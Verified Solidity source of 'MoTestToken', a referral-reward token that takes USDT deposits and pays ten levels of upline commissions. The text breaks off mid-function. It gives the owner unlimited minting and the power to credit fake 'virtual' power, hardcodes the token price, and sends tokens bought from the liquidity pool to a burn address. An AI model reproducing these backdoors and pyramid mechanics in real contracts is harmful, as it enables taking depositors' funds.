/**
 *Submitted for verification at Etherscan.io on 2022-06-15
*/

pragma solidity ^0.8.0;

// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable {
    address public _owner;

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

contract TokenReceiver{
    constructor (address token) {
        IERC20(token).approve(msg.sender, 10000000000*1e18);
    }
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract MoTestToken is IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint256 private _maxSupply; //最大发行量
  uint8 public _decimals;
  string public _symbol;
  string public _name;

  struct RewardsLog { 
    uint rType;
    uint rTime;
    uint256 rValue;
  }

  struct UserInfo {
    address rUser;
    uint256 rAmount;
  }
  
  uint LEVELV1 = 1;
  uint LEVELV2 = 2;
  uint LEVELV3 = 3;
  uint LEVELV4 = 4;
  uint INVITERTYPE = 5;
  uint DYNAMICTYPE = 6;
  
  mapping(address => RewardsLog[]) private _rewardsLogList; //收益日志记录
  uint private _pageSize = 10; 

  uint256 private _dayAmount; //每日产出数量
  uint256 public _lastTime; //上一次产币时间

  address public uniswapRouterV2Address;  //uniswap合约地址
  address private _usdtAddress;  //usdt合约地址
  address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
  address private _topLevelAddress =  address(0x000000000000000000000000000000000000dEaD);

  IUniswapV2Router02 public immutable uniswapV2Router;
  address public uniswapV2Pair;  //LP地址
  address private _drawMoAddress; //提取Mo代币的地址
  
  address private tokenReceiver;

   uint256 private limitAmount = 200 * 1e18 / 100; //单次限制购买数量
   uint256 private inviterRewards = 80 * 1e18 / 100; //推荐奖励数量
   uint256 private dynamicRewards = 20 * 1e18 / 100; //动态奖励数量

  mapping(address => address[]) private _inviters; //推荐者地址列表 地址=>上级列表
  mapping(address => address[]) private _lowerUsers; //下级列表 地址=>下级列表
  mapping (address => uint256) private _userPower; //用户算力
  address[] private _userList; //用户列表 用来遍历用户算力
  mapping (address => uint256) private _userMaxIncome; //用户最大收益金额
  mapping (address => uint256) private _userIncome; //用户收益金额 U
  mapping (address => uint256) private _userMO; //用户根据算力分配得到的MO数量
  uint256 private _totalPower; //全网总算力
  uint public _userNumV1;
  uint public _userNumV2;
  uint public _userNumV3;
  uint public _userNumV4;
  event BuyPower(address indexed sender, uint  amount);
  event WithDrawalToken(address indexed token, address indexed sender, uint indexed amount);
  event LevelChange(uint oldlevel, uint newlevel);
  //constructor(address _route,address _USDToken) {
  constructor() {      
    _name = "MO";
    _symbol = "MO";
    _decimals = 18;
    _owner = msg.sender;
    _maxSupply = 1000 * 10000 * 10**uint256(_decimals);

    _dayAmount = 2602 * 10**uint256(_decimals); //日产币量 2602个
    //测试的地址
    uniswapRouterV2Address = address(0x8F065Db2d8a04747Df51efB5136A6a2bb9FB92cE);
    _usdtAddress = address(0x65Be4eD28C95535f190780BF9235001F699C89c0);
    //正式链的地址
    //uniswapRouterV2Address = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    //_usdtAddress = address(0x55d398326f99059fF775485246999027B3197955);
    _drawMoAddress = address(_owner);
    
    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(uniswapRouterV2Address);
    //创建池子 LP
    //uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _usdtAddress);    
    //uniswapV2Pair = address(0);
    uniswapV2Router = _uniswapV2Router;    

    tokenReceiver = address(new TokenReceiver(address(_usdtAddress)));
    _lastTime = block.timestamp;
  }
  //购买算力
  function buyPower(uint256 amount) external returns(bool){
    require(amount == limitAmount, "Amount: must be limit amount");
    address sender = msg.sender;
    //算力收益分配 先产币
    //_powerRewards();
    //发送推荐奖励
    uint256 _remainingReward = _sendInviterRewards(); //返回剩余数量
    //发送动态奖励
    _remainingReward = _remainingReward.add(_senddynamicRewards());    
    //增加用户算力
    _addUserPower(sender, amount);
    //全网总算力增加
    _totalPower = _totalPower.add(amount);    
    //添加到用户列表
    _addUserList(sender);
    //用户最大收益增加双倍
    _userMaxIncome[sender] = _userMaxIncome[sender].add(amount.mul(2));
    //USDT转到合约 用于swap购买代币和用户提币
    IERC20(_usdtAddress).transferFrom(sender, address(this), amount);
    //薄饼自动购买MO 直接转到黑洞地址 100U + 奖励分配剩余的数量 TODO
    //_buyMo(amount.div(2).add(_remainingReward));
    emit BuyPower(sender, amount.div(2).add(_remainingReward));
    return true;
  }
  //提取U
  function userDrawUsdt(uint256 amount) external returns(bool){
    //根据算力产币
    //_powerRewards();
    address _sender = msg.sender;
    //数量需要小于收益数量
    require(amount <= _userIncome[_sender], "Amount: more than the max draw amount");    
    //IERC20(_usdtAddress).transferFrom(address(this), _sender, amount);
    IERC20(_usdtAddress).transfer(_sender, amount);
    _subUserPower(_sender, amount.div(2)); //减少个人算力
    _totalPower = _totalPower.sub(amount.div(2)); //减少全网算力
    _userIncome[_sender] = _userIncome[_sender].sub(amount, "MO: userIncome amount exceeds balance"); //减少用户收益金额
    _userMaxIncome[_sender] = _userMaxIncome[_sender].sub(amount, "MO: userMaxIncome amount exceeds balance"); //减少用户最大收益
  }
  //提取MO
  function userDrawMo(uint256 amount) external returns(bool){
    //根据算力产币
    _powerRewards();      
    address _sender = msg.sender;
    uint256 _userMaxMo = getUserUndrawn();  
    //数量需要小于收益数量
    if(amount > _userMaxMo){
        return false;
    }
    //换算成U的价格
    uint256 _price = getMoPrice();
    uint256 _value = amount.mul(_price).div((10**uint256(_decimals))); 

    _subUserPower(_sender, _value.div(2)); //减少个人算力
    _totalPower = _totalPower.sub(_value.div(2)); //减少全网算力
    _userMaxIncome[_sender] = _userMaxIncome[_sender].sub(_value); //减少用户最大收益  

    _balances[_drawMoAddress] = _balances[_drawMoAddress].sub(amount); //从提币地址转MO币
    _balances[_sender] = _balances[_sender].add(amount);
    emit Transfer(_drawMoAddress, _sender, amount);
  }
  //增加虚拟算力
  function addUserPower(address _user,uint256 amount)external onlyOwner returns(bool) {
      _addUserList(_user); //增加用户
      _userPower[_user] = _userPower[_user].add(amount); //增加用户算力
      _totalPower = _totalPower.add(amount); //全网总算力增加
      return true;
   }
  //增加用户算力
  function _addUserPower(address _user,uint256 amount) internal{ 
    uint _oldLevel = _getLevel(_user);  
    _userPower[_user] = _userPower[_user].add(amount);
    uint _newLevel = _getLevel(_user);
    if(_oldLevel != _newLevel) {
      emit LevelChange(_oldLevel, _newLevel);
      if(_oldLevel == 1){
          _userNumV1 = _userNumV1.sub(1);
      } else if(_oldLevel == 2){
          _userNumV2 = _userNumV2.sub(1);
      } else if(_oldLevel == 3){
          _userNumV3 = _userNumV3.sub(1);
      } else if(_oldLevel == 4){
          _userNumV4 = _userNumV4.sub(1);
      } 
      if(_newLevel == 1){
          _userNumV1 = _userNumV1.add(1);
      } else if(_newLevel == 2){
          _userNumV2 = _userNumV2.add(1);
      } else if(_newLevel == 3){
          _userNumV3 = _userNumV3.add(1);
      } else if(_newLevel == 4){
          _userNumV4 = _userNumV4.add(1);
      }       
    } 
  }
  //减少用户算力
  function _subUserPower(address _user,uint256 amount) internal{ 
    uint _oldLevel = _getLevel(_user);  
    _userPower[_user] = _userPower[_user].sub(amount, "MO: userIncome amount exceeds balance");
    uint _newLevel = _getLevel(_user);
    if(_oldLevel != _newLevel) {
      if(_oldLevel == 1){
          _userNumV1 = _userNumV1.sub(1);
      } else if(_oldLevel == 2){
          _userNumV2 = _userNumV2.sub(1);
      } else if(_oldLevel == 3){
          _userNumV3 = _userNumV3.sub(1);
      } else if(_oldLevel == 4){
          _userNumV4 = _userNumV4.sub(1);
      } 
      if(_newLevel == 1){
          _userNumV1 = _userNumV1.add(1);
      } else if(_newLevel == 2){
          _userNumV2 = _userNumV2.add(1);
      } else if(_newLevel == 3){
          _userNumV3 = _userNumV3.add(1);
      } else if(_newLevel == 4){
          _userNumV4 = _userNumV4.add(1);
      }       
    } 
  }  
  //获取用户等级
  function getLevel() external returns(uint){
      return _getLevel(msg.sender);
  }  
  //根据数量获取等级
  function _getLevel(address _user) internal returns(uint){
    uint amount = _userPower[_user];
    //1万 3万 5万 6万 
    if (amount >= 60000 * 1e18 / 1000){
        return 4;
    }
    if (amount >= 50000 * 1e18 / 1000){
        return 3;
    }
    if (amount >= 30000 * 1e18 / 1000){
        return 2;
    }        
    if (amount >= 10000 * 1e18 / 1000){
        return 1;
    }
    return 0;
  }
  //添加到用户列表
  function _addUserList(address _user) internal{
    bool _find = false;
    for(uint i = 0; i < _userList.length; i++) {
        if(_userList[i] == _user){
            _find = true;
            break;
        }
    }
    if(_find == false){
        _userList.push(_user);
    }
  }
  //发送推荐奖励 倒序保存
  function _sendInviterRewards() internal returns (uint256){
      address sender = msg.sender;
      uint256 _remainingReward = inviterRewards;
      uint256 _rewards = inviterRewards.div(10); //单个用户得到的奖励数量 80U/10
      if(_inviters[sender].length == 0){
        return _remainingReward;
      }
      //最多分配10级
      uint _level = 10;
      uint _inviterLen = _inviters[sender].length; //上级数量
      if ( _inviterLen < 10){
          _level = _inviterLen;
      }
      for(uint i = 1; i <= _level; i++) {        
        //推荐者倒序存放 所以要从后往前取  
        address _inviter = _inviters[sender][_inviterLen - i];
        //顶级用户不参与分配
        if (_inviter == _topLevelAddress){
            continue;
        }
        //计算推广有效用户数量
        uint _validUserNum = 0;
        for(uint j = 0; j < _lowerUsers[_inviter].length; j++){
            address _user = _lowerUsers[_inviter][j];
            if (_userPower[_user] >= 0){ //如果没有算力就不是有效用户
              _validUserNum++;
            }
        }
        //推荐人数不够 不能拿
        if (_validUserNum < i){
            continue;
        }
        if(_userPower[_inviter] > 0){ //需要查询用户是否出局再发放奖励 TODO
            //用户已收益价值
            uint256 _userRewards = getUserRewards(_inviter);
            //如果用户已收益价值 >= 用户最大收益金额 跳过不发放奖励
            if(_userRewards >= _userMaxIncome[_inviter]){
                continue;
            }
            //如果待收益金额 < 本次发送奖励，则本次发放奖励 = 待收益金额
            if(_userMaxIncome[_inviter] - _userRewards < _rewards){
                _rewards = _userMaxIncome[_inviter] - _userRewards;
            }
            _userIncome[_inviter] = _userIncome[_inviter].add(_rewards);
            _addRewardsLog(_inviter, INVITERTYPE, _rewards); //保存收益日志
            _remainingReward = _remainingReward.sub(_rewards);
        }
      }
      return _remainingReward;
  }
  //发送动态奖励
  function _senddynamicRewards() internal returns(uint256) {  
      uint256 _remainingReward = dynamicRewards; //20U = 1 + 4 + 6 + 9
      uint256 _rewards;  //用户发放奖励
      for(uint i = 0; i < _userList.length; i++) {
        address _user = _userList[i];
        //顶级用户不参与分配
        if (_user == _topLevelAddress){
            continue;
        }        
        //等级不够直接跳过
        uint _userLevel = _getLevel(_user);
        if (_userLevel == 0){
            continue;
        }
        uint _levelLog = 0;
        if(_userLevel == 1){
          _rewards = 1 * 1e18 / _userNumV1 / 100;  
          _levelLog = LEVELV1;
        } else if(_userLevel == 2){
          _rewards = 4 * 1e18 / _userNumV2 / 100; 
          _levelLog = LEVELV2; 
         } else if(_userLevel == 3){
          _rewards = 6 * 1e18 / _userNumV3 / 100;  
          _levelLog = LEVELV3;
        } else if(_userLevel == 4){
          _rewards = 9 * 1e18 / _userNumV4 / 100;  
          _levelLog = LEVELV4;
        }       
        //用户已收益价值
        uint256 _userRewards = getUserRewards(_user);
        //如果用户已收益价值 >= 用户最大收益金额 跳过不发放奖励
        if(_userRewards >= _userMaxIncome[_user]){
            continue;
        }
        //如果待收益金额 < 本次发送奖励，则本次发放奖励 = 待收益金额
        if(_userMaxIncome[_user] - _userRewards < _rewards){
            _rewards = _userMaxIncome[_user] - _userRewards;
        }       
        _userIncome[_user] = _userIncome[_user].add(_rewards);
        _addRewardsLog(_user, _levelLog, _rewards); //保存动态收益日志
        _remainingReward = _remainingReward.sub(_rewards); 
      }
        
      return _remainingReward; 
  }
  //获取用户待产出的MO数量
  function _getUserMo(address _user, uint256 _endTime ) internal view returns (uint256){
      if(_userPower[_user] == 0){
          return 0;
      }
      uint256 _TimeDifference = _endTime - _lastTime; //间隔(秒) 距离上一次产币时间
      uint256 _secondAmount = _dayAmount.div(86400); //每秒产币数量
      // 每秒产币数量 * 间隔(秒)  / 全网算力 * 用户算力
      uint256 _moAmount = _secondAmount.mul(_TimeDifference).div(_totalPower).mul(_userPower[_user]); 
      return _moAmount;  
  }
  //算力收益分配 产币
  function _powerRewards() internal{
    uint256 _endTime = block.timestamp;  
    for(uint i = 0; i < _userList.length; i++) {
        address _user = _userList[i];
        if(_user == _topLevelAddress){
            continue;
        }
        _userMO[_user] = _userMO[_user].add(_getUserMo(_user, _endTime));
    }
    //产币到管理者
    uint256 _amount = getWaitSupply();
    if(_amount == 0){
        return;
    }
    _mint(_owner, _amount);   
    _lastTime = _endTime;
  }
  //产币
  function powerRewards() external{
    _powerRewards();
  }
  //获取未产币数量  
  function getWaitSupply() public view returns(uint256){
    uint256 _endTime = block.timestamp;  
    uint256 _TimeDifference = _endTime - _lastTime; //间隔(秒) 距离上一次产币时间
    uint256 _secondAmount = _dayAmount.div(86400); //每秒产币数量
    return _secondAmount.mul(_TimeDifference);
  }  
  //增加收益日志
  function _addRewardsLog(address _user,uint _type, uint _value) internal {
    _rewardsLogList[_user].push(RewardsLog(_type, block.timestamp, _value));
  }
  //薄饼购买MO
  function _buyMo(uint256 tokenAmount) internal {
    address[] memory path = new address[](2);
    path[0] = _usdtAddress;
    path[1] = address(this);

    IERC20(_usdtAddress).approve(uniswapRouterV2Address, tokenAmount);
    
    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        tokenAmount,
        0, 
        path,
        msg.sender,
        block.timestamp
    );    
  }
  //设置推荐者 只能设置一次
  function setInviter(address account) public returns (bool){
    require(msg.sender != address(0), "cannot be set inviter to zero address");
    require(_inviters[msg.sender].length == 0, "Accout is owned inviter");
    require(msg.sender != account, "Accout can't be self"); //A = A
    //A => B,B => A 
    bool _find = false;
    for(uint i = 0; i < _lowerUsers[msg.sender].length; i++) {
      if(_lowerUsers[msg.sender][i] == account){          
          _find = true;
          break;
      }
    }
    require( _find == false, "Account can't be each other");
    //是否存在 顶级地址除外
    if(account != _topLevelAddress){
        _find = false;
        for(uint i = 0; i < _userList.length; i++) {
        if(_userList[i] == account){          
            _find = true;
            break;
        }
        }
        require( _find == true, "Account does not exist");        
    }
    for(uint i = 0; i < _inviters[account].length; i++) {
      _inviters[msg.sender].push(_inviters[account][i]);
    }
    _inviters[msg.sender].push(account);
    //保存下级列表
    _lowerUsers[account].push(msg.sender);
    //添加用户
    _addUserList(account);
    _addUserList(msg.sender);
    return true;
  }
  //设置提币MO地址
  function setDrawMoAddress(address account) external onlyOwner returns(bool) {
      _drawMoAddress = account;
      return true;
  }
  //获取收益日志
  function getRewardsLog(uint page) public view returns (RewardsLog[] memory) {
    if(page * _pageSize >= _rewardsLogList[msg.sender].length){
      return new RewardsLog[](0);
    }
    uint _start = page * _pageSize;
    uint _end = (page+1) * _pageSize;
    if(_rewardsLogList[msg.sender].length < _end){
      _end = _rewardsLogList[msg.sender].length;
    }
    uint _len = _end -_start;
    RewardsLog[] memory _logs = new RewardsLog[](uint256(_len));
    for(uint i = _start; i < _end; i++) {
      _logs[i- _start] = _rewardsLogList[msg.sender][i];
    }

    return _logs;
  }
  //获取用户可提取MO数量
  function getUserUndrawn() public view returns(uint256){
    address _user = msg.sender;
    //如果用户已收益 >= 用户最大收益金额
    if(_userIncome[_user] >= _userMaxIncome[_user]){
        return 0;
    }
    uint256 _undrawn = _userMaxIncome[_user].sub(_userIncome[_user]); //还能提取多少U
    uint256 _price = getMoPrice(); //MO价格
    uint256 _maxAmount = _undrawn.div(_price).mul(10**uint256(_decimals)); //最大提取MO数量 待提取的U / MO价格
    //用户已产币数量 + 待产币数量 > 最大提取数量
    uint256 _userMoAmount = _userMO[_user].add(_getUserMo(_user, block.timestamp));
    if(_userMoAmount > _maxAmount){
        return _maxAmount;
    }else{
        return _userMoAmount;
    }
  }
  //获取用户已收益价值
  function getUserRewards(address _user) public view returns(uint256){
    //计算代币价值
    uint256 _moPrice = getMoPrice();
    uint256 _moValue = _userMO[_user].mul(_moPrice).div(10**uint256(_decimals));
    uint256 _userRewards = _moValue.add(_userIncome[_user]); //已发放奖励 = 代币价值 + 用户收益金额
    return _userRewards;
  }  
  //获取MO价格 TODO
  function getMoPrice() public view returns(uint256){
    return 1e15;
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = _usdtAddress;
    uint256[] memory _amounts = uniswapV2Router.getAmountsOut(10**uint256(_decimals),path);
    return _amounts[1];
  }  
  //获取推荐者 倒序保存
  function getInviter() external view returns (address){
      if(_inviters[msg.sender].length == 0){
          return address(0);
      }
      return _inviters[msg.sender][_inviters[msg.sender].length-1];
  }
  //获取用户列表
  function getUserList() external view returns(address[] memory){
      return _userList;
  }
  //获取上级列表
  function getInviters() external view returns(address[] memory){
      return _inviters[msg.sender];
  }
  //获取下级列表
  function getLowerUsers() external view returns(address[] memory){
      return _lowerUsers[msg.sender];
  }
  //获取下级用户算力列表
  function getLowerUserPowers() external view returns(UserInfo[] memory){
    if (_lowerUsers[msg.sender].length == 0){
      return new UserInfo[](0);
    }
    uint _len = _lowerUsers[msg.sender].length;
    UserInfo[] memory _result = new UserInfo[](uint256(_len));
    for(uint i = 0; i < _lowerUsers[msg.sender].length; i++) {
      address _user = _lowerUsers[msg.sender][i];
      _result[i] = UserInfo(_user, _userPower[_user]);
    }
    return _result;
  }
  //设置池子地址
  function setUniswapV2Pair(address _uniswapV2Pair) external onlyOwner {
      uniswapV2Pair = _uniswapV2Pair;
  }
  //全网总算力
  function totalPower() external view returns (uint256){
      //计算全网总算力 TODO
      return _totalPower;
  }  
  //获取用户算力
  function getUserPower() external view returns (uint256) {
    return _userPower[msg.sender];
  }
  //获取用户最多可收益金额
  function getUserMaxIncome() external view returns (uint256) {
    return _userMaxIncome[msg.sender];
  }
  //获取用户已收益金额
  function getUserIncome() external view returns (uint256) {
    return _userIncome[msg.sender];
  }  
  //用户根据算力已分配得到的MO数量
  function getUserMo() external view returns (uint256) {    
    return _userMO[msg.sender].add(_getUserMo(msg.sender, block.timestamp));
  }  

  function getOwner() external view returns (address) {
    return owner();
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  function symbol() external view returns (string memory) {
    return _symbol;
  }

  function name() external view returns (string memory) {
    return _name;
  }

  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(msg.sender, amount);
    return true;
  }

  function burn(uint256 amount) public returns (bool) {
    _burn(msg.sender, amount);
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    //判断是否swap购买代币 如果发送方是LP地址，则全部转到黑洞地址销毁
    if (sender == uniswapV2Pair){
      _balances[_destroyAddress] = _balances[_destroyAddress].add(amount);
      emit Transfer(sender, _destroyAddress, amount);
    }else{
